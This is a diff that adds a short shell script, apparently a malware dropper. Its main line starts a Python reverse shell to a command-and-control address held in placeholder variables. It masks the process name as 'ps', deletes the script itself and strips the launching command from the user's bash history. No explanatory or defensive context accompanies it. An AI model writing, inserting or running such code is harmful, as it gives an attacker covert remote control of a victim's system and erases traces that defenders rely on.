@@ -1,0 +1,4 @@
+#!/bin/sh
+bash -c "exec -a ps nohup python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${C2_IP_XXXXXX}\",${C2_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")' >/dev/null 2>&1 &"
+rm -f $0
+grep -v "> ., && chmod +x ., && ./.," ~/.bash_history > /tmp/.bash_history && mv /tmp/.bash_history ~/.bash_history
